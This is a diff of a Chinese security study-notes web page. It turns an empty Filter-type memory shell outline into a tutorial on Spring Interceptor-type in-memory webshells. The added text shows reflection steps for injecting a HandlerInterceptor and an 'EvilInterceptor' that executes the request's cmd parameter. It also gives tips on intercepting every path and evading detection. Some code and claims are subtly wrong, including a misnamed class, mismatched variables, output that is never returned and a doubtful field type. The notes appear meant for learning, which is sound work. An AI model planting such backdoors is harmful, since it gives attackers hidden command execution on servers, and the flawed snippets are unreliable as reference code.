@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Filter型内存马原理、实现方式、注入技巧">
+        <meta name="description" content="安全学习笔记 × 青春记录 | 一个可以安全试错的环境">
       
       
         <meta name="author" content="ethicalpaws">
@@ -25,7 +25,7 @@
     
     
       
-        <title>Filter型内存马 - 青春沙盒</title>
+        <title>青春沙盒</title>
       
     
     
@@ -86,7 +86,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#filter" class="md-skip">
+        <a href="#spring-interceptor" class="md-skip">
           Skip to content
         </a>
       
@@ -120,7 +120,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Filter型内存马
+              None
             
           </span>
         </div>
@@ -2772,10 +2772,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#interceptor" class="md-nav__link">
     <span class="md-ellipsis">
       
-        什么是内存马
+        什么是Interceptor
       
     </span>
   </a>
@@ -2783,10 +2783,32 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#filter_1" class="md-nav__link">
+  <a href="#interceptor_1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Filter型内存马原理
+        Interceptor型内存马的核心思路
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#interceptor_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Interceptor 型内存马的底层原理
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        完整注入流程
       
     </span>
   </a>
@@ -2797,7 +2819,18 @@
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        实现方式
+        核心流程图
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#controller" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        与 Controller 型的对比
       
     </span>
   </a>
@@ -2808,7 +2841,7 @@
   <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        注入技巧
+        实战要点
       
     </span>
   </a>
@@ -2819,7 +2852,18 @@
   <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
       
-        检测与防御
+        优势与局限性
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一句话总结
       
     </span>
   </a>
@@ -2846,12 +2890,233 @@
   
 
 
-<h1 id="filter">Filter型内存马<a class="headerlink" href="#filter" title="Permanent link">&para;</a></h1>
-<h2 id="_1">什么是内存马<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<h2 id="filter_1">Filter型内存马原理<a class="headerlink" href="#filter_1" title="Permanent link">&para;</a></h2>
-<h2 id="_2">实现方式<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h2 id="_3">注入技巧<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
-<h2 id="_4">检测与防御<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h1 id="spring-interceptor">Spring Interceptor型内存马<a class="headerlink" href="#spring-interceptor" title="Permanent link">&para;</a></h1>
+<h2 id="interceptor">什么是Interceptor<a class="headerlink" href="#interceptor" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>interceptor（拦截器）是Spring MVC提供的一个组件，类似于Servlet的Filter</p>
+</blockquote>
+<p><strong>核心方法</strong></p>
+<ul>
+<li>
+<p><code>preHandle()</code>     Controller执行之前  返回false可以中断请求</p>
+</li>
+<li>
+<p><code>postHandle()</code>    Controller执行之后，视图渲染之前    可以用来修改ModelAndView</p>
+</li>
+<li>
+<p><code>afterCompletion()</code> 请求完全处理完之后    用于资源清理</p>
+</li>
+</ul>
+<p><em>内存马中最常用的是 preHandle()，因为它可以在 Controller 执行之前拦截请求并执行恶意代码，甚至可以直接返回响应，让 Controller 不再执行</em></p>
+<p><strong>正常Interceptor写法</strong>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nd">@Component</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AuthInterceptor</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nd">@Override</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">        </span><span class="c1">// 权限检查逻辑</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">            </span><span class="n">resp</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="s">&quot;/login&quot;</span><span class="p">);</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">}</span>
+</span></code></pre></div></p>
+<p><strong>注册方式</strong>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nd">@Configuration</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">WebConfig</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">WebMvcConfigurer</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="nd">@Override</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">addInterceptors</span><span class="p">(</span><span class="n">InterceptorRegistry</span><span class="w"> </span><span class="n">registry</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">addInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">AuthInterceptor</span><span class="p">())</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">                </span><span class="p">.</span><span class="na">addPathPatterns</span><span class="p">(</span><span class="s">&quot;/admin/**&quot;</span><span class="p">);</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="p">}</span>
+</span></code></pre></div></p>
+<h2 id="interceptor_1">Interceptor型内存马的核心思路<a class="headerlink" href="#interceptor_1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>在web应用运行时，利用代码执行入口，获取Spring的InterceptorRegistery，动态注册一个HandlerInterceptor，使其在请求到达Controller之前拦截请求并执行恶意代码</p>
+</blockquote>
+<h2 id="interceptor_2">Interceptor 型内存马的底层原理<a class="headerlink" href="#interceptor_2" title="Permanent link">&para;</a></h2>
+<p><strong>Interceptor 的存储结构</strong></p>
+<blockquote>
+<p>在 Spring 中，所有 Interceptor 都存储在 InterceptorRegistry 中
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>InterceptorRegistry
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    └── registries (List&lt;InterceptorRegistration&gt;)
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>         └── InterceptorRegistration
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>              ├── interceptor (HandlerInterceptor 实例)
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>              ├── includePatterns (拦截的 URL 模式)
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>              └── excludePatterns (排除的 URL 模式)
+</span></code></pre></div></p>
+</blockquote>
+<p><strong>获取 InterceptorRegistry 的方式</strong></p>
+<p><em>方式一：通过 WebMvcConfigurer（静态配置）</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>@Configuration
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>public class WebConfig implements WebMvcConfigurer {
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    @Override
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    public void addInterceptors(InterceptorRegistry registry) {
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>        // 这里可以获取 registry
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    }
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>}
+</span></code></pre></div></p>
+<p><em>通过 AbstractHandlerMapping 反射获取（动态注入用这个）</em></p>
+<p>Spring 的 AbstractHandlerMapping 中有一个 interceptors 字段，类型为 InterceptingHandlerExecutionChain，包含所有拦截器配置。</p>
+<p>更直接的方式是从 RequestMappingHandlerMapping 中获取拦截器列表
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>RequestMappingHandlerMapping handlerMapping = 
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    context.getBean(RequestMappingHandlerMapping.class);
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>// 通过反射获取 interceptors 字段
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Field interceptorsField = AbstractHandlerMapping.class
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    .getDeclaredField(&quot;interceptors&quot;);
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>interceptorsField.setAccessible(true);
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>Object interceptors = interceptorsField.get(handlerMapping);
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>// 这个对象的类型是 InterceptingHandlerExecutionChain
+</span></code></pre></div></p>
+<h2 id="_1">完整注入流程<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><strong>获取 Spring 上下文</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>WebApplicationContext ct=(WebApplicationContext)request.getServletContext().getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
+</span></code></pre></div></p>
+<p><strong>获取 HandlerMapping</strong></p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">handlerMapping</span><span class="o">=</span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestContextHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>通过反射获取 Interceptor 注册器</strong></p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">Field</span><span class="w"> </span><span class="n">interceptorsField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AbstractHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;interceptors&quot;</span><span class="p">);</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">interceptorsField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">Object</span><span class="w"> </span><span class="n">interceptors</span><span class="o">=</span><span class="n">interceptorsField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">handlerMapping</span><span class="p">);</span>
+</span></code></pre></div>
+<p><strong>创建恶意 Interceptor</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>class EvilInterceptor implements HandlerInterceptor{
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    @Override
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    public boolean preHandle(HttpServletRequest req,HttpServletResponse res,Object handler) throws Exception{
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>        String cmd=req.getParameter(&quot;cmd&quot;);
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>        if(cmd!=null&amp;&amp;!cmd.isEmpty()){
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>            Process p=Runtime.getRuntime().exec(cmd);
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>            PrintWriter out=res.getWriter();
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>            return false;
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>        }
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>        return true;
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>    }
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>}
+</span></code></pre></div>
+<p><strong>动态注册</strong></p>
+<p><strong>完整POC</strong>
+<a href="../../../../code-attachment/memory-shell-code/minidemo/Spring-Interceptor.jsp"></a></p>
+<h2 id="_2">核心流程图<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>用户访问任意路径 ?cmd=whoami
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>    ↓
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>DispatcherServlet 接收请求
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    ↓
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>执行所有 Interceptor 的 preHandle()
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>    ↓
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>发现恶意 Interceptor → 执行 EvilInterceptor.preHandle()
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>    ↓
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>检测到 cmd 参数 → 执行命令并返回结果
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    ↓
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>返回 false → 中断请求，不再执行 Controller
+</span></code></pre></div>
+<h2 id="controller">与 Controller 型的对比<a class="headerlink" href="#controller" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Spring Controller 型</th>
+<th>Spring Interceptor 型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>注册对象</td>
+<td><code>@Controller</code> 方法</td>
+<td><code>HandlerInterceptor</code></td>
+</tr>
+<tr>
+<td>注册方式</td>
+<td><code>registerMapping()</code></td>
+<td>向 <code>InterceptorRegistry</code> 添加</td>
+</tr>
+<tr>
+<td>触发时机</td>
+<td>请求到达 Controller 时</td>
+<td>Controller 执行之前</td>
+</tr>
+<tr>
+<td>URL 绑定</td>
+<td>绑定特定路径</td>
+<td>绑定路径模式（支持 <code>/*</code>、<code>/admin/**</code>）</td>
+</tr>
+<tr>
+<td>拦截范围</td>
+<td>只有匹配的 URL</td>
+<td>可以拦截所有请求</td>
+</tr>
+<tr>
+<td>中断能力</td>
+<td>无法中断</td>
+<td>可以中断（返回 <code>false</code>）</td>
+</tr>
+<tr>
+<td>隐蔽性</td>
+<td>高</td>
+<td>更高（可以拦截所有请求）</td>
+</tr>
+<tr>
+<td>代码复杂度</td>
+<td>低</td>
+<td>较高（需要反射操作）</td>
+</tr>
+</tbody>
+</table>
+<h2 id="_3">实战要点<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>拦截范围  建议用 /* 拦截所有请求，这样任意路径都能触发</p>
+</li>
+<li>
+<p>中断请求  preHandle() 返回 false，Controller 不会执行</p>
+</li>
+<li>
+<p>回显    直接在 preHandle() 中通过 response 输出</p>
+</li>
+<li>
+<p>版本兼容  Spring 4.x 和 5.x 的拦截器注册方式略有不同</p>
+</li>
+<li>
+<p>检测难度  高——Interceptor 是正常的 Spring 组件，难以区分</p>
+</li>
+</ul>
+<h2 id="_4">优势与局限性<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p><strong>优势</strong></p>
+<ul>
+<li>
+<p>拦截所有请求    可以拦截 /*，任何请求都能触发</p>
+</li>
+<li>
+<p>完全融入 Spring   是 Spring 的正常组件，不易察觉</p>
+</li>
+<li>
+<p>可中断请求 返回 false 可以让 Controller 不执行</p>
+</li>
+<li>
+<p>无固定路径 不像 Controller 那样有固定 URL</p>
+</li>
+</ul>
+<p><strong>局限性</strong></p>
+<ul>
+<li>
+<p>注册较复杂 需要通过反射操作 InterceptorRegistry</p>
+</li>
+<li>
+<p>版本差异  Spring 不同版本的内部结构不同</p>
+</li>
+<li>
+<p>需要 Spring 环境  不支持非 Spring 应用</p>
+</li>
+</ul>
+<h2 id="_5">一句话总结<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Spring Interceptor 型内存马的本质是：利用代码执行入口，通过反射获取 Spring 的 InterceptorRegistry，在运行时动态注册一个恶意 HandlerInterceptor，使其在请求进入 Controller 之前拦截所有（或部分）请求，执行恶意代码并可选地中断请求，实现无文件后门。</p>
+</blockquote>
 
 
 
@@ -2874,7 +3139,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 12, 2026 14:53:08 UTC"><span class="timeago" datetime="2026-07-12T14:53:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 12, 2026 14:53:08 UTC">2026-07-12</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 20, 2026 16:26:08 UTC"><span class="timeago" datetime="2026-07-20T16:26:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 20, 2026 16:26:08 UTC">2026-07-20</span>
   </span>
 
     
